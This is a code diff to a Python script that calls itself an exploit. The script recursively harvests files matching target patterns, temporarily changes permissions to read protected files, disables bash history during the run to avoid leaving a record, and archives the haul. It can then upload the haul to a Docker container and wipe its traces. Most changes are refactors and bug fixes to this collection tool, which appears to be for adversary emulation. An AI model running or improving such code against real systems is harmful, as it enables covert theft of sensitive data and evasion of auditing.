@@ -30,10 +30,17 @@ logger.setLevel(logging.DEBUG)
 
 def execute_automated_collection(src, dest, archive, archive_name, upload, container, clean_dest):
     """
-    Traverses recursively through the src directory and copies any files that match at least one pattern in
-     TARGET_REGEX_PATTERNS or with an extension listed in TARGET_EXTENSIONS. Files are copied into the dest directory.
-     If archive is True, a tarball will be created with the name archive_name in the dest directory. If clean_dest is
-     True, all collected documents will be deleted at the end of the script.
+    PRE-CONDITIONS: [Operating System = "Linux/MacOS", Installed Software = "Python 3, Docker (optional)"]
+        Assumes user has root access
+
+    POST- CONDITIONS: If clean_dest is False, there should be a folder with a copy of all the matched files in dest.
+    If clean_dest is True, there will be no persisted changes to the existing filesystem.
+
+
+    This exploit traverses recursively through the src directory and copies any files that match at least one pattern in
+    TARGET_REGEX_PATTERNS or with an extension listed in TARGET_EXTENSIONS. Files are copied into the dest directory.
+    If archive is True, a tarball will be created with the name archive_name in the dest directory. If clean_dest is
+    True, all collected documents will be deleted at the end of the script.
 
      If upload is True a container name must be provided. The script will upload the tarball or the files
      (if tarball not generated) to the container
@@ -47,10 +54,10 @@ def execute_automated_collection(src, dest, archive, archive_name, upload, conta
     :param clean_dest: If True, deletes all collected files at the end of the script
     """
     pause_bash_history_command = "set +o history"
-    run_bash_command(pause_bash_history_command)
+    run_bash_command_split(pause_bash_history_command)
 
     create_and_validate_permissions(dest)
-    search_filesystem(src, dest)
+    find_target_files(src, dest)
 
     tar_file = ''
     if archive:
@@ -69,7 +76,11 @@ def execute_automated_collection(src, dest, archive, archive_name, upload, conta
         clean_files(dest)
 
     resume_bash_history_command = "set -o history"
-    run_bash_command(resume_bash_history_command)
+    run_bash_command_split(resume_bash_history_command)
+
+
+def run_bash_command_split(command):
+    run_bash_command(command.split())
 
 
 def run_bash_command(command):
@@ -82,7 +93,7 @@ def run_bash_command(command):
     process.communicate()
 
 
-def search_filesystem(src, dest):
+def find_target_files(src, dest):
     """
     Walks through the src directory copying files to dest. Uses TARGET_EXTENSIONS and TARGET_REGEX_PATTERNS to match
     files. Permissions are temporarily modified to ensure files can be copied. Restoration of permissions leaves
@@ -91,9 +102,9 @@ def search_filesystem(src, dest):
     :param dest: The directory to copy files to
     """
     for root, dirs, files in os.walk(src):
-        for dir in dirs:
+        for directory in dirs:
             try:
-                d = os.path.join(root, dir)
+                d = os.path.join(root, directory)
                 original_permissions = get_permissions(d)
                 if original_permissions < OWNER_READ_EXECUTE_PERMISSIONS:
                     logger.info(
@@ -103,7 +114,7 @@ def search_filesystem(src, dest):
                         original_permissions)
 
                     modify_permissions(d, OWNER_READ_EXECUTE_PERMISSIONS)
-                    search_filesystem(d)
+                    find_target_files(d, dest)
                     modify_permissions(d, original_permissions)
             except Exception as e:
                 logger.error(e)
@@ -117,7 +128,7 @@ def search_filesystem(src, dest):
                     if original_permissions < OWNER_READ_PERMISSIONS:
                         logger.info(
                             "File does not have owner read permissions. Permissions will be temporarily modified. "
-                            "File: %s, current permissions: %d", d, original_permissions)
+                            "File: %s, current permissions: %d", f, original_permissions)
                         modify_permissions(f, OWNER_READ_PERMISSIONS)
                     MD5.update(str(datetime.now()).encode("utf-8"))
                     name, ext = os.path.splitext(file)
@@ -224,7 +235,8 @@ if __name__ == '__main__':
     parser.add_argument('--archive_name', type=str, default='collection.tar.gz', help='The name of the archive if '
                                                                                       'created')
     parser.add_argument('--upload', type=parse_bool_arg, default=False,
-                        help='Uploads collection to a docker container. '
+                        help='Uploads collection to a docker container from the host system. The container must '
+                             'already be running.'
                              'A container name must be provided with '
                              'the --container_name argument')
     parser.add_argument('--container_name', type=str, help='The name of the docker container to upload files to')
